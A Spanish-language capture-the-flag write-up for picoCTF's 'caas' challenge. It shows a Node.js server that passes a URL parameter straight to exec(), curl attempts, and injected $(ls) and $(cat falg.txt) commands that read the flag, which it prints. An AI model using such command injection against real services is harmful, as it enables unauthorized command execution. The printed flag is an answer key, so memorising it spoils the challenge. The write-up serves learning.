# Retos picoCTF

# Level caas

## Objetivo
Now presenting cowsay as a service
Challenge Endpoints
Download index.js	index.js

## Solucion
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}

para este reto vemos que la pagina nos manda a /cowsay/{mensaje} 

Vemos que no verifica lo que se le escriba, por lo que hacemos uso de $() para poder comunicarnos con la consola traté de enviarle los parametrosn directo en consola, pero no funcionó, así que lo hice directo en la pagina, primero con /cowsay/$(ls) con eso nos muestra que hay un archivo llamado falg.txt, se abre con $(cat falg.txt) y nos da la bandera

'''
┌──(kali㉿kali)-[~/Downloads/caas]
└─$ curl https://caas.mars.picoctf.net/ 
<!doctype html>
<html>
    <head>
        <link rel="stylesheet" href="styles.css"/>
        <script src="index.js"></script>
        <title>CaaS</title>
    </head>
    <body>
        <h1>Cowsay as a Service</h1>
        <strong>Make a request to the following URL to cowsay your message:</strong>
        <br>
        <code></code>
    </body>
</html>
                                                                           
┌──(kali㉿kali)-[~/Downloads/caas]
└─$ cat index.js                       
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});
                                                                           
┌──(kali㉿kali)-[~/Downloads/caas]
└─$ curl https://caas.mars.picoctf.net/cowsay/vamosviendodijoesciego
 ________________________
< vamosviendodijoesciego >
 ------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
                                                                           
┌──(kali㉿kali)-[~/Downloads/caas]
└─$ curl https://caas.mars.picoctf.net/cowsay/'ls'                  
 ____
< ls >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
                                                                           
┌──(kali㉿kali)-[~/Downloads/caas]
└─$ curl https://caas.mars.picoctf.net/cowsay/´ls´
 __
< ´ls´  >
 --
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
                                                                           
┌──(kali㉿kali)-[~/Downloads/caas]
└─$ curl https://caas.mars.picoctf.net/cowsay/`ls` 
 __________
< index.js >
 ----------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
                                                                           
┌──(kali㉿kali)-[~/Downloads/caas]
└─$ curl https://caas.mars.picoctf.net/cowsay/`cat index.js`
 _______
< const >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
curl: (6) Could not resolve host: express
curl: (3) URL rejected: Bad hostname
curl: (3) URL rejected: Bad hostname
curl: (6) Could not resolve host: const
curl: (6) Could not resolve host: app
curl: (3) URL rejected: Bad hostname
curl: (3) URL rejected: Bad hostname
curl: (6) Could not resolve host: const
curl: (3) unmatched brace in URL position 1:
{
 
'''

## Referencias


